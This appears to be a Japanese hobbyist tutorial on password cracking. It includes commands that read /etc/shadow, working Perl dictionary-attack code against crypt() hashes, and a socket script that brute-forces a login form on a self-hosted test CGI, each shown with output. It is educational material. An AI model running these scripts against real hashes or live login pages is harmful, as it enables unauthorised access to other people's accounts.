@@ -1,0 +1,328 @@
+
+
+
+Password crack入門
+
+
+1. はじめに
+
+自転車などによく使われるダイヤル式のチェーンロック(※１)。自転車を盗むためにはこれを解かなければならない。そんなときは、ダイヤルを 1111, 1112, 1113, 1114, .... 6665, 6666 と試していけばいつか必ず解けます。つまりダイヤル式チェーンロックを使っている自転車は時間さえあれば「盗める！」ということです。(まぁペンチで切ればダイヤルもクソもないんですけどね) さて、もちろんこれは PC で使用されるパスワードでも同じことです。インターネットがこんなに当たり前に使用される現代。セキュリティの必要性にともなってパスワードはさまざまなところで利用されています。ということで今回はパスワードクラックについてやりたいと思います。パスクラについての詳細はセキュリティアカデメイアにパスワードクラック講座(※２)というとても有意義な記事がありますので参照してください。
+
+http://www.terao-inc.com/chiaro4.html                              ※１
+http://akademeia.info/main/lecture3/tokubetu_password_cracking.htm ※２
+
+
+2. 身近な暗号文
+
+もしあなたが Linux を使っているならばまず /etc/passwd もしくは /etc/shadow を見てください。( /etc/shadow は root権限 が必要です) すると
+
+[bash-2.03]$ cat /etc/passwd
+root:x:0:1:Super-User:/:/usr/bin/csh
+daemon:x:1:1::/:
+bin:x:2:2::/usr/bin:
+..........
+..........
+
+というようなテキストが表示されるはずです。この中から自分のユーザーＩＤを探すと
+
+kenji:3ckbO8536vo2.:13345:1001::kenji:kenji:......
+
+がみつかります。もし見つからない場合は
+
+[bash-2.03]$ perl -e "print join(':',getpwnam('kenji'));"
+kenji:3ckbO8536vo2.:13345:1001::kenji:kenji:......
+
+で見つかるかも知れませんが、drill.hackerslab.org で試したところ。
+
+[level0@drill level0]$ perl -e "print join(':',getpwnam('level0'));"
+level0:x:2000:2000::::/home/level0:/bin/bash[level0@drill level0]$
+
+となり案の定、暗号文が x となってました。この場合はしかたないのでどうにかして /etc/shadow をみるしかないです(^^;
+
+[bash-2.03]# cat /etc/shadow
+root:...........................
+....................
+.........................
+kenji:3ckbO8536vo2.:13345:1001::kenji:kenji:......
+
+　※ログイン時の認証では パスワードとして入力された文字列をcrypt関数で暗
+　　号化して出来た暗号文とここに保存されてる文字列を比較して一致したら正
+　　しいパスワードが入力されたと判断するということが行われているようです。
+
+さて、暗号文がみつかりました。「 3ckbO8536vo2. 」です。これはDES暗号化アルゴリズムを元にして作られたcrypt関数を使用しての暗号化後の文字列です。つまり「 3ckbO8536vo2. 」がパスワードを暗号化した文字列(暗号文)であるわけです。では果たしてこの文字列からパスワードを推測することはできるでしょうか。もしこの暗号文を眺めてみてパスワードが分かったならばおそらくあなたは超人的な頭脳の持ち主でしょう。私のような凡人には無理ですので話を進めます(^^;
+
+確かに暗号文からパスワードを推測することは無理ですが、「ある文字列」を同じようなアルゴリズムで暗号化して、もし「 3ckbO8536vo2. 」と一致したならばその「ある文字列」はパスワードということになりますよね。ということで crypt関数 を利用したプログラムを書いてみます。
+
+
+3. crypt関数を使う
+
+サンプルは Perl と C で書きます。
+
+crypt.pl
+------------------------------------------------------------------------------
+#!/usr/bin/perl
+
+$str = crypt( $ARGV[0], $ARGV[1] );
+print $str . "\n";
+------------------------------------------------------------------------------
+<Linux>
+crypt]$ chmod 755 crypt.pl
+crypt]$ ./crypt.pl bbbbbbbb aa 
+aaZbwOjboVU62
+crypt]$
+
+<Windows>
+C:\Documents and Settings\kenji>perl crypt.pl bbbbbbbb aa
+aaZbwOjboVU62
+C:\Documents and Settings\kenji>
+
+crypt.c
+------------------------------------------------------------------------------
+#include <crypt.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+        if(argc < 3){
+                fprintf(stderr, "%s [string] [salt]\n",argv[0]);
+                exit(1);
+        }
+
+        printf("%s\n", crypt(argv[1], argv[2]));
+        return 0;
+}
+------------------------------------------------------------------------------
+crypt]$ gcc -Wall crypt.c -lcrypt 
+crypt]$ ./a.out bbbbbbbb aa
+aaZbwOjboVU62
+crypt]$
+
+crypt関数にかんする詳細は(※３)をみてください。引数は２つあり、第一引数が「平文(passwd)」、第二引数が「塩(salt)」となっています。crypt.pl の引数をいろいろ変えて実行してみると分かると思いますが、暗号文の最初の２文字が 塩(salt) となっています。つまり暗号文をみただけで少なくとも salt は分かるわけです。よってcrypt関数の第二引数に渡すべき値は分かるわけです。ではさっき出てきた「 3ckbO8536vo2. 」から見事パスワードを暴いてみましょう。
+
+http://www.linux.or.jp/JM/html/LDP_man-pages/man3/crypt.3.html  ※３
+
+
+4. パスワードクラック
+
+整理してみましょう。まず暗号文「 3ckbO8536vo2. 」があります。そして salt は 「 3c 」ですね。つまり "3ckbO8536vo2." = crypt( $plain, "3c" ) が真ならば $plain が見事パスワードということになります。さて、では $plain はどこから持ってくるのか？それは８文字以下の適当な文字列でも良いですし、辞書から引っ張ってきてもＯＫです。ちなみに８文字以下の(べつに８文字以上でもかまいませんが)すべての文字列を総当りで試していく方法を ブルートフォースアタック(Brute Force Attack：総当り攻撃) と呼び、辞書(いろんな単語が書かれてあるテキストファイル)にある文字列を次々に試していく方法を ディクショナリーアタック（辞書式攻撃）と呼ぶようです。
+
+どちらでもかまわないのですが、総当りだとものすごい時間がかかる可能性があるのでここでは辞書を使ったパスクラを試してみましょう。そのためには辞書が必要になりますので私が使っていたであろう辞書をＵＰしました。(最近ＨＤの掃除をしたんですよ。そしたら出てきたんです^^;)
+
++----------------------------------------------------+
+| http://kenjinet.s26.xrea.com/crypt/dictionary.html |
++----------------------------------------------------+
+
+↑ＤＬ用のページを用意しました。辞書は８ＭＢほどありますので右クリックでＤＬしたほうが良いと思います。無事ＤＬが完了したらいよいよパスワードクラック用のプログラムを書きます。
+
+crypt2.pl
+------------------------------------------------------------------------------
+#!/usr/bin/perl
+
+open(FILE, $ARGV[1]) or die "file open error!\n";
+
+while( $line = <FILE> ){
+	chomp($line);
+	if( $ARGV[0] eq crypt($line, $ARGV[0]) ){
+		print "Passwd Get!  " . $line . "\n";
+		exit;
+	}
+}
+
+close(FILE);
+
+print "Passwd Not Found!\n";
+
+exit;
+------------------------------------------------------------------------------
+C:\Documents and Settings\kenji>perl -cw crypt2.pl
+crypt.pl syntax OK
+C:\Documents and Settings\kenji>perl crypt2.pl 3ckbO8536vo2. dictionaryA.txt
+Passwd Get!  xhXOFlrW
+C:\Documents and Settings\kenji>
+
+見事！パスワードが取得できました。(最近の PC ならば数秒で解けるはずです) ではプログラムの説明をします。まず第二引数に辞書ファイルを、第一引数に暗号文を渡します。辞書の一行ずつを $line にいれていき chomp で改行を省いたあとに crypt に渡していきます。crypt の第二引数には暗号文がそのまま渡されてますが、これは結局最初の２文字しか使われないので同じことです。そしてそれが crypt の戻り値が暗号文と同じならばパスワード取得！となります。
+
+
+5. crypt関数 　～其の弐～
+
+さっき「DES暗号化アルゴリズムを元にして作られたcrypt関数」というようなメチャクチャ誤解を招く書き方をしてしまいましたが正確には「DES暗号化アルゴリズムを元にして作られたアルゴリズム」ということです。(でもこの言い方もややこしいですよね) んで、crypt関数は DES 以外にも暗号化のアルゴリズムが使えます。それは MD5 です。これについての詳細は RFC1321(MD5 message digest Algorythm) を参照してください。では MD5 のアルゴリズムを利用した暗号化を試してみたいと思います。しかし、私が試してみたところ Linux ではちゃんと MD5 で暗号化できたのですが、 Windows の Active Perl ver 5.6.1 では無理でした。(なんでだー) もしかしたら Linux でも出来ないことがあるかも知れないです。
+
+mcrypt.pl
+------------------------------------------------------------------------------
+#!/usr/bin/perl
+
+$str = crypt($ARGV[0], '$1$'.$ARGV[1].'$');
+
+print $str . "\n";
+------------------------------------------------------------------------------
+[kenji@localhost md5]$ chmod 755 mcrypt.pl
+[kenji@localhost md5]$ ./mcrypt.pl dddddd eeeee
+$1$eeeee$oTyGTVdlfSpVHNnWH40431
+[kenji@localhost md5]$ 
+
+mcrypt.c
+------------------------------------------------------------------------------
+#include <crypt.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+        char salt[16];
+        unsigned len;
+
+        if(argc < 3){
+                fprintf(stderr, "%s [string] [salt]\n",argv[0]);
+                exit(1);
+        }
+
+        if((len = strlen(argv[2])) > 8) len = 8;
+
+        memset(salt, '\0', sizeof(salt));
+        memcpy(salt, "$1$", 3);
+        memcpy(salt + 3, argv[2], len);
+        salt[ 3 + len ] = '$';
+
+        printf("%s\n", crypt(argv[1], salt));
+        return 0;
+}
+------------------------------------------------------------------------------
+[kenji@localhost md5]$ gcc -Wall mcrypt.c -lcrypt
+[kenji@localhost md5]$ ./a.out dddddd eeeee
+$1$eeeee$oTyGTVdlfSpVHNnWH40431
+[kenji@localhost md5]$ 
+
+私が現在使っている Linux では /etc/shadow が次のようになっています。(暗号文などは多少変更しています)
+
+[root@localhost /]# cat /etc/shadow
+root:$1$Up8MhYQi$J4ykagSTaqND0Emv3VCPf.:12398:0:99999:7:::
+bin:*:12398:0:99999:7:::
+postfix:!!:12398:0:99999:7:::
+.............
+..............
+kenji:$1$2i9i8SQn$Rp7CfDb7nsHRB8sy0JIogn:12398:0:99999:7:::
+
+このように DES アルゴリズムではなく MD5 アルゴリズムが使われている場合もあるようです。
+
+
+6. オンラインパスワードクラック
+
+今度はネットワークを経由してのパスワードクラックを試してみます。しかし実際に運営されているＨＰで試すことはさすがにできないので自前でサーバを用意しなければなりません。私は WindowsXP + AN HTTP(※４) で試しました。設定に関する詳細は KENT氏 のＨＰの「自宅のマシンWWWサーバ化計画」(※５)が大変参考になりました。まずはターゲットの CGI を作成します。
+
+http://www.st.rim.or.jp/~nakata/  ※４
+http://www.kent-web.com/www/      ※５
+
+target.cgi
+------------------------------------------------------------------------------
+#!/usr/bin/perl
+
+$str = "NO!";
+
+if($ENV{'REQUEST_METHOD'} eq "POST") {
+	read(STDIN, $buf, $ENV{'CONTENT_LENGTH'});
+	if($buf eq "pwd=dJ") { $str = "OK!"; }
+}
+
+print "Content-Type: text/html\r\n\r\n";
+print << "HTML";
+<html>
+<body>
+<p>$str</p>
+<h3>パスワードクラックテスト</h3>
+<form method="post" action="./target.cgi">
+<input type="password" name="pwd" size="8" maxlength="8" value="">
+</form>
+</body>
+</html>
+HTML
+
+exit;
+------------------------------------------------------------------------------
+
+パスワードは"dJ"とします。(dictionaryA.txt のちょうど100行目にあります) 正しいパスワードが入力されたら"OK!"という文字列を出力し、そのほかはすべて"NO!"という文字列を出力するようにしています。このCGIをパスワードクラックのターゲットとします。では今度は攻撃するプログラムをかきます。
+
+crypt3.pl
+------------------------------------------------------------------------------
+#!/usr/bin/perl
+
+use Socket;
+
+#-- 初期設定
+$server = 'localhost';
+$path   = '/target.cgi';
+
+open(FILE, $ARGV[0]) or die "file open error!\n";
+
+while( $line = <FILE> ){
+	chomp($line);
+	$body = 'pwd=' . $line;
+	$len  = length($body);
+
+	#-- データ作成
+	$data  = "POST $path HTTP/1.1\n";
+	$data .= "Host: localhost\n";
+	$data .= "Content-Length: $len\n";
+	$data .= "\n";
+	$data .= $body;
+
+	#-- 改行を"\r\n"に変更
+	$data =~ s/\x0D\x0A|\x0D|\x0A/\r\n/g;
+
+	#-- 接続処理
+	if((Connect($server, 'http', 'tcp', 80)) != 0){
+		print "Connect ERROR!\n";
+		exit;
+	}
+
+	#-- 送信
+	print SOCK "$data";
+
+	#-- レスポンスを受け取る
+	while($res = <SOCK>){
+		$res =~ s/\x0D\x0A|\x0D|\x0A/\n/g;
+		if($res =~ /<p>OK!<\/p>/){
+			print "SUCCESS! \n" . "Passwd is $line.\n";
+			exit;
+		}
+		if($res =~ /<\/html>/) { last; }
+	}
+	close(SOCK); select(STDOUT);
+}
+
+close(FILE);
+exit;
+
+
+#################################################
+# Connect サブルーチン
+#################################################
+sub Connect{
+
+	my($port, $struct);
+
+	if(($port = getservbyname($_[1], $_[2])) == NULL){
+		$port = $_[3];
+	}
+        $struct = sockaddr_in($port, inet_aton($_[0]));
+        socket(SOCK, PF_INET, SOCK_STREAM, 0) || return(-1);
+        connect(SOCK, $struct) || return(-2);
+        select(SOCK); $| = 1; select(STDOUT);
+
+	return(0);
+}
+------------------------------------------------------------------------------
+C:\Documents and Settings\kenji>crypt3.pl dictionaryA.txt
+SUCCESS!
+Passwd is dJ.
+C:\Documents and Settings\kenji>
+
+このプログラムの説明は Wizard Bible vol.5「HTTP入門　～連続投稿の仕組み～」を参照してください。このプログラムを試したところ私の PC ではたった 100行程度 の文字列しか試さないのに 10秒 ほどかかってしまいました(^^; ローカルでやるのと比べると全然遅い(当たり前ですが)です。このプログラムだと一度の接続にたいして一回のリクエストしか送ってないので、接続維持を利用してちょっと工夫すればもっと速くなりそうですが、やはりスピードはローカルでやるほうが断然速いのは仕方ないです。
+
+ネットワークを経由するのでプログラムは長くなりますが、結局やってることは同じです。ちょっと工夫を加えればBasic認証などにも対応できそうですがそのへんよく分からないので止めときます(^^;
+
+
+7. 最後に
+
+さて、いかがだったでしょうか。パスワードクラックツールは John the Ripper, L0phtCrack(?) などいろいろあるようですが、実際プログラムを書いてみるとさらに楽しめると思います。John the Ripperと解析時間を比べてみるといった楽しみ方もありますし(ただJohnはムチャクチャ速いですよ) 本格的にパスクラツールを作るんならやはり DES暗号化アルゴリズム などを学ぶ必要があるでしょう。これを機会に「暗号理論」などに興味を持ってもらえれば幸いです。私のサイト(http://kenjinet.s26.xrea.com/)に暗号アルゴリズム解説のページがありますのでよければこちらも参考にしてください。最後になりましたが、ここまで付き合って読んでくださった方有り難うございました。
+
+では、また会う日まで...
+
